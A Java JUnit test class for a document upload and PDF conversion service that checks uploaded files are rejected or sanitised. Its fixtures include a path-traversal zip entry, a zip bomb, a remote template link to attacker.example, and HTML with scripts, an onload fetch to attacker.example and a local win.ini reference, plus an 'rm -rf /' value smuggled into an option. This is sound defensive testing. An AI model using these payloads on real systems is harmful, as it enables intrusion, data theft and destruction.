package com.houqing.tools.video_compressor_backend.document;

import com.fasterxml.jackson.databind.JsonNode;
import com.houqing.tools.video_compressor_backend.media.Tool;
import com.houqing.tools.video_compressor_backend.support.ApiTestBase;
import com.houqing.tools.video_compressor_backend.support.TestMedia;
import org.apache.pdfbox.pdmodel.PDDocument;
import org.apache.pdfbox.pdmodel.PDPage;
import org.apache.pdfbox.pdmodel.encryption.AccessPermission;
import org.apache.pdfbox.pdmodel.encryption.StandardProtectionPolicy;
import org.apache.poi.ss.util.CellRangeAddress;
import org.apache.poi.xssf.usermodel.XSSFSheet;
import org.apache.poi.xssf.usermodel.XSSFWorkbook;
import org.apache.poi.xwpf.usermodel.*;
import org.junit.jupiter.api.Test;
import org.springframework.http.MediaType;
import org.springframework.test.web.servlet.MvcResult;

import java.io.ByteArrayOutputStream;
import java.nio.charset.StandardCharsets;
import java.util.List;
import java.util.Map;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import static org.assertj.core.api.Assertions.assertThat;
import static org.junit.jupiter.api.Assumptions.assumeTrue;

/** V2 P0 item 3 (D-01 upload/type checks, D-02 conversion matrix, inspect / preview). Real tools, generated fixtures. */
class DocumentStudioTests extends ApiTestBase {

    // ---------------- fixtures ----------------

    static byte[] docx(String extraFont) throws Exception {
        try (XWPFDocument doc = new XWPFDocument(); ByteArrayOutputStream out = new ByteArrayOutputStream()) {
            XWPFParagraph title = doc.createParagraph();
            XWPFRun r = title.createRun();
            r.setText("科普讲解比赛报名表");
            r.setFontFamily("SimSun");
            r.setFontSize(18);
            XWPFParagraph p = doc.createParagraph();
            XWPFRun r2 = p.createRun();
            r2.setText("姓名：____    电话：____    ${school}");
            if (extraFont != null) r2.setFontFamily(extraFont);
            XWPFTable t = doc.createTable(3, 2);
            t.getRow(0).getCell(0).setText("姓名");
            t.getRow(1).getCell(0).setText("学校");
            t.getRow(2).getCell(0).setText("作品");
            for (int i = 0; i < 60; i++) doc.createParagraph().createRun().setText("第 " + (i + 1) + " 行说明文字，用来让文档跨越多页。");
            doc.write(out);
            return out.toByteArray();
        }
    }

    static byte[] xlsx() throws Exception {
        try (XSSFWorkbook wb = new XSSFWorkbook(); ByteArrayOutputStream out = new ByteArrayOutputStream()) {
            XSSFSheet a = wb.createSheet("名单");
            String[] head = {"序号", "姓名", "学校", "电话"};
            var h = a.createRow(0);
            for (int c = 0; c < head.length; c++) h.createCell(c).setCellValue(head[c]);
            for (int i = 1; i <= 40; i++) {
                var row = a.createRow(i);
                row.createCell(0).setCellValue(i);
                row.createCell(1).setCellValue("学生" + i);
                row.createCell(2).setCellValue("第" + (i % 5 + 1) + "中学");
                row.createCell(3).setCellValue("1380000" + String.format("%04d", i));
            }
            a.addMergedRegion(new CellRangeAddress(42, 42, 0, 3));
            a.createRow(42).createCell(0).setCellValue("合计 40 人");
            wb.setPrintArea(0, "A1:D43");
            XSSFSheet b = wb.createSheet("备注");
            b.createRow(0).createCell(0).setCellValue("只在备注页出现的文字");
            wb.write(out);
            return out.toByteArray();
        }
    }

    static byte[] zip(Map<String, byte[]> entries) throws Exception {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try (ZipOutputStream z = new ZipOutputStream(bos)) {
            for (var e : entries.entrySet()) {
                z.putNextEntry(new ZipEntry(e.getKey()));
                z.write(e.getValue());
                z.closeEntry();
            }
        }
        return bos.toByteArray();
    }

    static final byte[] CT = "<?xml version=\"1.0\"?><Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\"/>".getBytes(StandardCharsets.UTF_8);
    static final byte[] DOC = "<w:document xmlns:w=\"http://schemas.openxmlformats.org/wordprocessingml/2006/main\"/>".getBytes(StandardCharsets.UTF_8);

    private MvcResult up(byte[] bytes, String name, User u) throws Exception {
        return uploadBytes("/api/files/upload", bytes, name, u);
    }

    private String upOk(byte[] bytes, String name, User u) throws Exception {
        MvcResult r = up(bytes, name, u);
        assertThat(r.getResponse().getStatus()).as(name + " -> " + r.getResponse().getContentAsString()).isEqualTo(200);
        return json(r).path("fileId").asText();
    }

    private void rejected(byte[] bytes, String name, User u, int status, String code) throws Exception {
        MvcResult r = up(bytes, name, u);
        assertThat(r.getResponse().getStatus()).as(name).isEqualTo(status);
        assertThat(json(r).path("code").asText()).as(name).isEqualTo(code);
    }

    private JsonNode convert(String fileId, Map<String, Object> options, User u) throws Exception {
        MvcResult r = postJson("/api/v2/documents/convert", Map.of("sourceFileId", fileId, "targetFormat", "pdf", "options", options), u);
        assertThat(r.getResponse().getStatus()).as(r.getResponse().getContentAsString()).isEqualTo(202);
        return waitTask(json(r).path("taskId").asText(), u, 180_000);
    }

    // ---------------- D-01: what may come in ----------------

    @Test
    void realOfficeFilesAreAcceptedAsDocumentsWithChecksum() throws Exception {
        User u = register();
        MvcResult r = up(docx(null), "报名表.docx", u);
        assertThat(r.getResponse().getStatus()).isEqualTo(200);
        JsonNode f = json(r);
        assertThat(f.path("mediaType").asText()).isEqualTo("DOCUMENT");
        assertThat(f.path("info").path("format").asText()).isEqualTo("docx");
        assertThat(f.path("info").path("sha256").asText()).hasSize(64);
        assertThat(json(up(xlsx(), "汇总.xlsx", u)).path("info").path("format").asText()).isEqualTo("xlsx");
        assertThat(json(up("<html><body><p>你好</p></body></html>".getBytes(StandardCharsets.UTF_8), "page.html", u))
                .path("mediaType").asText()).isEqualTo("DOCUMENT");
    }

    @Test
    void disguisedMaliciousAndLegacyFilesAreRejected() throws Exception {
        User u = register();
        rejected(zip(Map.of("a.txt", "hello".getBytes())), "renamed.docx", u, 415, "UNSUPPORTED_DOCUMENT");
        rejected(docx(null), "fake.xlsx", u, 415, "UNSUPPORTED_DOCUMENT"); // real docx, wrong extension
        rejected(docx(null), "macro.docm", u, 415, "UNSUPPORTED_DOCUMENT");
        rejected(zip(Map.of("[Content_Types].xml", CT, "word/document.xml", DOC, "word/vbaProject.bin", new byte[]{1, 2, 3})),
                "vba.docx", u, 415, "UNSUPPORTED_DOCUMENT");
        rejected(zip(Map.of("[Content_Types].xml", CT, "word/document.xml", DOC, "../../evil.txt", "x".getBytes())),
                "traversal.docx", u, 422, "DOCUMENT_CORRUPTED");
        rejected(zip(Map.of("[Content_Types].xml", CT, "word/document.xml", DOC, "word/big.bin", new byte[40 * 1024 * 1024])),
                "bomb.docx", u, 422, "DOCUMENT_CORRUPTED"); // 40 MiB of zeros compresses ~1000:1
        String rels = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">"
                + "<Relationship Id=\"r1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\""
                + " Target=\"http://attacker.example/t.dotm\" TargetMode=\"External\"/></Relationships>";
        rejected(zip(Map.of("[Content_Types].xml", CT, "word/document.xml", DOC, "word/_rels/settings.xml.rels",
                rels.getBytes(StandardCharsets.UTF_8))), "template.docx", u, 415, "UNSUPPORTED_DOCUMENT");
        byte[] ole = new byte[1024];
        System.arraycopy(new byte[]{(byte) 0xD0, (byte) 0xCF, 0x11, (byte) 0xE0, (byte) 0xA1, (byte) 0xB1, 0x1A, (byte) 0xE1}, 0, ole, 0, 8);
        rejected(ole, "locked.docx", u, 422, "DOCUMENT_PASSWORD_REQUIRED"); // Office wraps encrypted OOXML in OLE2
        rejected(ole, "old.doc", u, 415, "UNSUPPORTED_DOCUMENT");
        rejected(new byte[]{(byte) 0xC3, 0x28, '<', 'p', '>'}, "latin.html", u, 415, "UNSUPPORTED_DOCUMENT"); // not UTF-8
        assertThat(json(get("/api/files?role=INPUT", u)).path("totalElements").asInt()).isZero(); // nothing was kept
    }

    @Test
    void hyperlinksAreNotMistakenForExternalContent() throws Exception {
        User u = register();
        String rels = "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">"
                + "<Relationship Id=\"r9\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink\""
                + " Target=\"https://example.org\" TargetMode=\"External\"/></Relationships>";
        assertThat(up(zip(Map.of("[Content_Types].xml", CT, "word/document.xml", DOC, "word/_rels/document.xml.rels",
                rels.getBytes(StandardCharsets.UTF_8))), "links.docx", u).getResponse().getStatus()).isEqualTo(200);
    }

    // ---------------- inspect / preview / isolation ----------------

    @Test
    void inspectReportsStructureFontsAndPrintAreas() throws Exception {
        User u = register(), other = register();
        String d = upOk(docx("NoSuchFontXyz"), "报名表.docx", u);
        JsonNode di = json(get("/api/v2/documents/" + d + "/inspect", u));
        assertThat(di.path("format").asText()).isEqualTo("docx");
        assertThat(di.path("tables").get(0).path("rows").asInt()).isEqualTo(3);
        assertThat(di.path("tables").get(0).path("cols").asInt()).isEqualTo(2);
        assertThat(di.path("missingFonts").toString()).contains("NoSuchFontXyz");
        assertThat(di.path("warnings").toString()).contains("NoSuchFontXyz");

        String x = upOk(xlsx(), "汇总.xlsx", u);
        JsonNode xi = json(get("/api/v2/documents/" + x + "/inspect", u));
        assertThat(xi.path("sheets").size()).isEqualTo(2);
        assertThat(xi.path("sheets").get(0).path("name").asText()).isEqualTo("名单");
        assertThat(xi.path("sheets").get(0).path("usedRows").asInt()).isEqualTo(43);
        assertThat(xi.path("sheets").get(0).path("printArea").asText()).isEqualTo("名单!A1:D43");
        assertThat(xi.path("warnings").toString()).contains("备注").doesNotContain("「名单」未设置");

        String h = upOk("<html><head><script>alert(1)</script><link rel=stylesheet href=http://x.example/a.css></head><body onload=steal()>hi</body></html>"
                .getBytes(StandardCharsets.UTF_8), "p.html", u);
        JsonNode hi = json(get("/api/v2/documents/" + h + "/inspect", u));
        assertThat(hi.path("willRemove").path("脚本").asInt()).isEqualTo(1);
        assertThat(hi.path("willRemove").path("事件脚本属性").asInt()).isEqualTo(1);

        assertThat(get("/api/v2/documents/" + d + "/inspect", other).getResponse().getStatus()).isEqualTo(404);
        assertThat(get("/api/v2/documents/" + d + "/inspect", null).getResponse().getStatus()).isEqualTo(401);
    }

    @Test
    void encryptedPdfNeedsPasswordAndIsNeverRendered() throws Exception {
        User u = register();
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        try (PDDocument doc = new PDDocument()) {
            doc.addPage(new PDPage());
            StandardProtectionPolicy pol = new StandardProtectionPolicy("owner-pw", "user-pw", new AccessPermission());
            pol.setEncryptionKeyLength(128);
            doc.protect(pol);
            doc.save(out);
        }
        String id = upOk(out.toByteArray(), "locked.pdf", u);
        var r = get("/api/v2/documents/" + id + "/inspect", u);
        assertThat(r.getResponse().getStatus()).isEqualTo(422);
        assertThat(json(r).path("code").asText()).isEqualTo("DOCUMENT_PASSWORD_REQUIRED");
        assertThat(json(get("/api/v2/documents/" + id + "/preview?page=1", u)).path("code").asText()).isEqualTo("DOCUMENT_PASSWORD_REQUIRED");
        assertThat(json(r).path("message").asText()).doesNotContain("user-pw");
    }

    @Test
    void pdfPreviewUsesATicketBoundToThatFile() throws Exception {
        User u = register();
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        try (PDDocument doc = new PDDocument()) {
            doc.addPage(new PDPage());
            doc.addPage(new PDPage());
            doc.save(out);
        }
        String a = upOk(out.toByteArray(), "a.pdf", u);
        String b = upOk(out.toByteArray(), "b.pdf", u);
        JsonNode p = json(get("/api/v2/documents/" + a + "/preview?page=2", u));
        assertThat(p.path("pageCount").asInt()).isEqualTo(2);
        String url = p.path("imageTicketUrl").asText();
        MvcResult img = get(url, null);
        assertThat(img.getResponse().getStatus()).isEqualTo(200);
        assertThat(img.getResponse().getContentType()).isEqualTo(MediaType.IMAGE_PNG_VALUE);
        assertThat(img.getResponse().getContentAsByteArray()).startsWith((byte) 0x89, (byte) 'P', (byte) 'N', (byte) 'G');
        String ticket = url.substring(url.indexOf("ticket=") + 7);
        assertThat(get("/api/v2/documents/" + b + "/preview/1.png?ticket=" + ticket, null).getResponse().getStatus()).isEqualTo(401);
        assertThat(get("/api/v2/documents/" + a + "/preview?page=3", u).getResponse().getStatus()).isEqualTo(400);
    }

    @Test
    void matrixOnlyListsExplicitRoutesAndUnsupportedDirectionsAreRefused() throws Exception {
        User u = register();
        JsonNode m = json(get("/api/v2/documents/matrix", u));
        assertThat(m.path("routes").toString()).contains("\"from\":\"docx\"", "\"from\":\"xlsx\"", "\"from\":\"html\"");
        String d = upOk(docx(null), "a.docx", u);
        var r = postJson("/api/v2/documents/convert", Map.of("sourceFileId", d, "targetFormat", "exe"), u);
        assertThat(r.getResponse().getStatus()).isEqualTo(400);
        r = postJson("/api/v2/documents/convert", Map.of("sourceFileId", d, "targetFormat", "pdf", "options", Map.of("shell", "rm -rf /")), u);
        assertThat(json(r).path("message").asText()).contains("不支持的转换参数");
        assertThat(json(get("/api/tasks", u)).path("totalElements").asInt()).isZero();
    }

    // ---------------- D-02: the three P0 conversions, really run ----------------

    @Test
    void docxConvertsToAVerifiedPdfAndReportsMissingFonts() throws Exception {
        assumeTrue(TestMedia.tools().available(Tool.SOFFICE), "LibreOffice not installed");
        User u = register();
        String d = upOk(docx("NoSuchFontXyz"), "报名表.docx", u);
        JsonNode t = convert(d, Map.of(), u);
        assertThat(t.path("status").asText()).as(t.toString()).isEqualTo("SUCCEEDED");
        JsonNode res = t.path("result");
        assertThat(res.path("verification").path("status").asText()).isEqualTo("VERIFIED");
        assertThat(res.path("pages").asInt()).isGreaterThanOrEqualTo(2);
        assertThat(res.path("warnings").toString()).contains("NoSuchFontXyz"); // substitution is disclosed, not hidden
        assertThat(t.path("output").path("mediaType").asText()).isEqualTo("PDF");
        assertThat(t.path("output").path("filename").asText()).isEqualTo("报名表.pdf");
        // the original upload is untouched and still a DOCX
        assertThat(json(get("/api/files/" + d, u)).path("mediaType").asText()).isEqualTo("DOCUMENT");
        // Office files keep their own page setup
        var bad = postJson("/api/v2/documents/convert", Map.of("sourceFileId", d, "targetFormat", "pdf",
                "options", Map.of("orientation", "LANDSCAPE")), u);
        assertThat(bad.getResponse().getStatus()).isEqualTo(400);
    }

    @Test
    void xlsxConvertsAllVisibleSheetsOrOnlyTheChosenOnes() throws Exception {
        assumeTrue(TestMedia.tools().available(Tool.SOFFICE), "LibreOffice not installed");
        User u = register();
        String x = upOk(xlsx(), "汇总.xlsx", u);
        JsonNode all = convert(x, Map.of(), u);
        assertThat(all.path("status").asText()).as(all.toString()).isEqualTo("SUCCEEDED");
        JsonNode one = convert(x, Map.of("sheetNames", List.of("名单")), u);
        assertThat(one.path("status").asText()).isEqualTo("SUCCEEDED");
        assertThat(one.path("result").path("pages").asInt()).isLessThan(all.path("result").path("pages").asInt());
        var missing = postJson("/api/v2/documents/convert", Map.of("sourceFileId", x, "targetFormat", "pdf",
                "options", Map.of("sheetNames", List.of("不存在"))), u);
        assertThat(missing.getResponse().getStatus()).isEqualTo(400);
        assertThat(json(missing).path("details").path("fields").path("sheetNames").asText()).contains("名单");
    }

    @Test
    void htmlConvertsWithoutScriptsOrNetworkAndHonoursPageSetup() throws Exception {
        assumeTrue(TestMedia.tools().available(Tool.CHROMIUM), "no Chromium-family browser");
        User u = register();
        String html = "<!doctype html><html><head><title>说明</title><script>document.body.innerHTML='HACKED'</script>"
                + "<link rel=stylesheet href='http://attacker.example/x.css'></head>"
                + "<body onload=\"fetch('http://attacker.example')\"><h1>活动说明</h1><p>正文内容</p>"
                + "<img src='file:///C:/Windows/win.ini'><img src='http://attacker.example/p.png'>"
                + "<iframe src='https://example.org'></iframe></body></html>";
        String h = upOk(html.getBytes(StandardCharsets.UTF_8), "说明.html", u);
        JsonNode t = convert(h, Map.of("pageSize", "A4", "orientation", "LANDSCAPE", "marginMm", 12), u);
        assertThat(t.path("status").asText()).as(t.toString()).isEqualTo("SUCCEEDED");
        JsonNode res = t.path("result");
        assertThat(res.path("verification").path("status").asText()).isEqualTo("VERIFIED");
        assertThat(res.path("pageSize").asText()).isEqualTo("A4 横向");
        assertThat(res.path("removed").path("脚本").asInt()).isEqualTo(1);
        assertThat(res.path("removed").path("外部或本地文件引用").asInt()).isEqualTo(2);
        assertThat(res.path("removed").toString()).contains("iframe");
        var badMargin = postJson("/api/v2/documents/convert", Map.of("sourceFileId", h, "targetFormat", "pdf",
                "options", Map.of("marginMm", 99)), u);
        assertThat(badMargin.getResponse().getStatus()).isEqualTo(400);
    }

    @Test
    void sanitizerLeavesNoActiveContentAndAddsCsp() {
        HtmlSanitizer.Result r = HtmlSanitizer.sanitize("<p onclick=x() style=\"background:url(http://e.x/a.png)\">"
                + "<a href='javascript:alert(1)'>a</a><a href='#top'>top</a><img src='data:image/png;base64,AAAA'>"
                + "<style>@import url(http://e.x/b.css); body{background:url('data:image/png;base64,AA')}</style>", "@page { margin: 5mm }");
        String out = r.html().toLowerCase();
        assertThat(out).doesNotContain("onclick", "javascript:", "http://e.x", "@import");
        assertThat(out).contains("href=\"#top\"", "data:image/png;base64,aaaa", "content-security-policy", "@page { margin: 5mm }");
        assertThat(r.totalRemoved()).isGreaterThanOrEqualTo(4);
    }
}
